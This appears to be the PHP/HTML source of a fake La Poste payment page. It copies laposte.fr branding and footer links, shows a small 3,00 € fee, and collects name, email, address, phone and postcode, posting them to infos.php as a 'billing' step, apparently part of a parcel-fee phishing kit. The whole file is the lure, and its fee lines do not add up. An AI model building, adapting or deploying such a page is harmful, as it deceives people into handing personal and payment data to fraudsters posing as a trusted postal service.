<?php 

require_once "functions.php";
?>


<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Paiement</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">  
  <link rel="stylesheet"  href="css/hover.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/title.ico" type="image/x-icon" />
  <link rel="shortcut icon" href="image/title.ico" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>
     <header>
         <div class="row align-items-center">
             <div class="col-lg-6">
                 <div class="logo py-4 px-5">
                     <img src="image/logo.png">
                 </div>
             </div>
             <div class="col-lg-6">
                 <div class="nave text-center">
                     <img src="image/nav.png">
                 </div>
             </div>
         </div>
     </header>
     <section class="py-5">
         <div class="billing">
             <div class="container">
                 <div class="row">
                     <div class="col-lg-7">
                         <h1>Votre Information</h1>
                         <p class="mb-5">Veuillez saisir toutes les informations</p>

                         <div class="form bg-white px-5 py-4">
                             <h4 class="mb-4">Des Détails</h4>

                             <form action="infos.php" method="post">

                                <input type="hidden" value="billing" name="step">

                                 <div class="name d-flex justify-content-between mt-4">
                                     <div class="last">
                                         <input class="form-control mt-4" type="text" placeholder="Prénom" name="prénom">
                                         <?php
                                             if( !empty($_SESSION['errors']['prénom']) ) {
                                             echo '<div class="error" class="error">the value is required</div>';}
                                        ?>
                                     </div>
                                     <div class="first">
                                         <input class="form-control mt-4" type="text" placeholder="Nom" name="nom">
                                         <?php
                                            if( !empty($_SESSION['errors']['nom']) ) {
                                            echo '<div class="error" class="error">the value is required</div>';}
                                        ?>
                                     </div>
                                 </div>
                                 <div class="form-group">
                                     <input class="form-control mt-4" type="text" placeholder="Adresse e-mail" name="email">
                                     <?php
                                          if( !empty($_SESSION['errors']['email']) ) {
                                            echo '<div class="error" class="error">the value is required</div>';}
                                      ?>
                                 </div>
                                 <div class="form-group">
                                     <input class="form-control mt-4" type="text" placeholder="Votre adresse" name="adresse">
                                     <?php
                                          if( !empty($_SESSION['errors']['adresse']) ) {
                                            echo '<div class="error" class="error">the value is required</div>';}
                                     ?>
                                 </div>
                                 <div class="form-group">
                                     <input class="form-control mt-4" type="text" placeholder="Ville" name="ville">
                                 </div>
                                 <div class="form-group">
                                     <input class="form-control mt-4" type="text" placeholder="N° de téléphone" name="tele">
                                     <?php
                                        if( !empty($_SESSION['errors']['ville']) ) {
                                            echo '<div class="error" class="error">the value is required</div>';}
                                      ?>
                                 </div>
                                 <div class="form-group">
                                     <input class="form-control mt-4" type="text" placeholder="Code Postale" name="zip">
                                     <?php
                                        if( !empty($_SESSION['errors']['zip']) ) {
                                            echo '<div class="error" class="error">the value is required</div>';}
                                    ?>
                                 </div>

                                 <div class="bttn">
                                     <button name="submit" style="width:100%" class="btn btn-warning py-2 mt-5 text-start">Valider</button>
                                 </div>
                             </form>
                         </div>
                     </div>

                     <div class="col-lg-5">
                         <div class="frais bg-white py-4">
                             <div class="montant d-flex justify-content-between">
                                 <span>Montant total HT</span>
                                 <p>02,12 €</p>
                             </div>
                             <div class="montant d-flex justify-content-between">
                                 <span>Montant TVA</span>
                                 <p>0,00 €</p>
                             </div>
                             <div class="montant d-flex justify-content-between">
                                 <span>Montant total HT</span>
                                 <p>0,08 €</p>
                             </div>
                             <hr>
                             <div class="montant d-flex justify-content-between">
                                 <span style="font-size:20px;font-weight: 700;">Total TTC</span>
                                 <p style="font-size: 20px;font-weight:700;">03,00 €</p>
                             </div>
                             <div class="pay-image mt-5">
                                 <img src="image/Paiement.png">
                             </div>
                         </div>
                     </div>
                 </div>
             </div>

             <div class="enga text-center py-5 mt-5">
                 <h2>Les engagements de laposte.fr</h2>
                 <ul class="list-unstyled d-lg-flex justify-content-between align-items-baseline px-5 py-5 " >
                     <li>
                         <img style="width: 65px;" src="image/livraison.png">
                        <p class="mt-4">Livraison gratuite <br><strong>dès 25€ d'achat</strong></p>
                     </li>
                     <li>
                         <img style="width: 65px;" src="image/aide.png">
                        <p class="mt-4">Proche de vous</p>
                     </li>
                     <li>
                         <img style="width: 65px;" src="image/tarifs.png">
                        <p class="mt-4">Tarifs</p>
                     </li>
                     <li>
                         <img style="width: 65px;" src="image/ecologic-logo-test.jpg">
                        <p class="mt-4">Priorité neutralité carbone</p>
                     </li>
                     <li>
                         <ul id="img-card" class="list-unstyled d-flex justify-content-between">
                             <li>
                                 <img src="image/payment-cb.jpg">
                             </li>
                             <li>
                                 <img src="image/payment-mastercard.png">
                             </li>
                             <li>
                                 <img src="image/payment-visa.png">
                             </li>
                             <li>
                                 <img src="image/payment-paylib.png">
                             </li>
                             <li>
                                 <img src="image/payment-paypal.png">
                             </li>
                         </ul>
                        <p class="mt-4">Paiements 100% sécurisés</p>
                     </li>
                 </ul>
             </div>
         </div>
     </section>

     <footer>
         <div class="footer py-5 px-4">
             <div class="row">
                 <div class="col-lg-4">
                     <ul class="list-unstyled">
                        <h4 class="mt-3 mb-3">Vos produits et services</h4>
                         <li>Timbres et enveloppes</li>
                         <li>Envoyer sans vous déplacer</li>
                         <li>Déménagement, Absence</li>
                         <li>Envois importants</li>
                         <li>Collection</li>
                         <li>Veiller sur vos proches</li>
                         <li>L’Identité Numérique</li>
                         <li>Vendre sur la Marketplace La Poste</li>
                     </ul>
                 </div>

                 <div class="col-lg-4">
                     <ul class="list-unstyled">
                        <h4 class="mt-3 mb-3">Comparateur d'envoi</h4>
                         <li>Préparer votre envoi</li>
                         <li>Grille de tarifs Courrier</li>
                         <li>Grille de tarifs Colis</li>
                         <li>Courrier/document</li>
                         <li>Bouteille</li>
                         <li>Chaussures</li>
                         <li>Vêtement/accessoire</li>
                         <li>CDVD/Vidéo</li>
                         <li>Informatique</li>
                         <li>High-tech</li>
                         <li>Auto-Moto</li>
                         <li>Livres</li>
                         <li>Clés & papiers d'identité</li>
                     </ul>
                 </div>

                 <div class="col-lg-4">
                     <ul class="list-unstyled">
                         <li>Mon espace client</li>
                         <li>Aide et contact</li>
                         <li>Espace sourds et malentendants</li>
                         <h4 class="mt-3 mb-3">Mieux nous connaître</h4>
                         <li>Plan du site</li>
                         <li>Accessibilité</li>
                         <li>Accessibilité App Youpix</li>
                         <li>Conditions contractuelles</li>
                         <li>Mentions légales</li>
                         <li>Données personnelles et cookies</li>
                     </ul>
                 </div>
             </div>

             <div class="footer-bottom">
                  <ul class="list-unstyled d-lg-flex  justify-content-between align-items-baseline px-5 py-5">
                     <li>
                         <img  src="image/app-laposte.png">
                        <p class="mt-4">Application La Poste</p>
                     </li>
                     <li>
                         <img  src="image/Logo-app-digiposte-new3.png">
                        <p class="mt-4">Digiposte</p>
                     </li>
                     <li>
                         <img  src="image/youpix.png">
                        <p class="mt-4">Youpix</p>
                     </li>
                     <li>
                         <img  src="image/logo-app-laposte-mobile-new.png">
                        <p class="mt-4">La Poste Mobile</p>
                     </li>
                     <li>
                         <img  src="image/app-ardoiz.png">
                        <p class="mt-4">La Poste Mobile</p>
                     </li>
                     <li>
                         <img  src="image/app-quoty.png">
                        <p class="mt-4">Tablette Ardoiz</p>
                     </li>
                </ul>
             </div>
         </div>
     </footer>

  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/test.js"></script>
</body>
</html>